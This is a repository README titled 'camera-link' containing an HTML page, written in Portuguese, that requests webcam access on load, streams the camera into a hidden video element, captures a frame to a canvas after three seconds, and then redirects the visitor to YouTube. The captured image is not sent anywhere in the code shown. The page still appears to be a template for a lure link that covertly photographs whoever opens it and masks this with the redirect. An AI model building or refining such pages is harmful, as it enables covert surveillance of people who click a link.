# camera-link
<!DOCTYPE html>
<html>
<head>
    <title>Captura de Imagem</title>
</head>
<body>
    <h1>Capturando sua imagem...</h1>
    <video id="webcam" autoplay muted style="display:none"></video>
    
    <script>
        async function initWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Redirecionar para YouTube
                    window.location.href = "https://youtube.com";
                }, 3000);
            } catch (err) {
                console.error("Erro ao acessar webcam:", err);
                window.location.href = "https://youtube.com";
            }
        }
        
        window.addEventListener('load', initWebcam);
    </script>
</body>
</html>
